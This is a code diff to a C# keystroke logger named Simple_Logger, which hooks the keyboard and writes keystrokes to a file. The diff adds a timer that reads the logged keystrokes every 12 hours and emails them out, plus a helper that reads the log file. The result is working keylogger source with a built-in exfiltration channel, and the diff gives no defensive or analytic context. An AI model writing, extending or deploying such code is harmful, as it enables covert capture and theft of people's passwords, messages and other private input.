@@ -81,6 +81,19 @@ namespace Simple_Logger
                 WriteToFile(filePath);
             });
 
+            // Send an email every 12 hours
+
+            Observable.Interval(TimeSpan.FromHours(12)).Subscribe(x =>
+            {
+                // Read keystrokes from file
+
+                var keystrokes = ReadFromFile(filePath);
+
+                // Send an email
+
+                Email.SendEmail(keystrokes);
+            });
+
             Hook._hookId = Hook.SetHook(Hook.Proc);
             Application.Run();
 
@@ -104,6 +117,15 @@ namespace Simple_Logger
             // Remove keystrokes that have been written to file from storage
 
             Keys.Clear();
+        }
+
+        // Read key strokes from file
+
+        private static string ReadFromFile(string filePath)
+        {
+            var keystrokes = File.ReadAllText(filePath);
+
+            return keystrokes;
         }
     }
 }
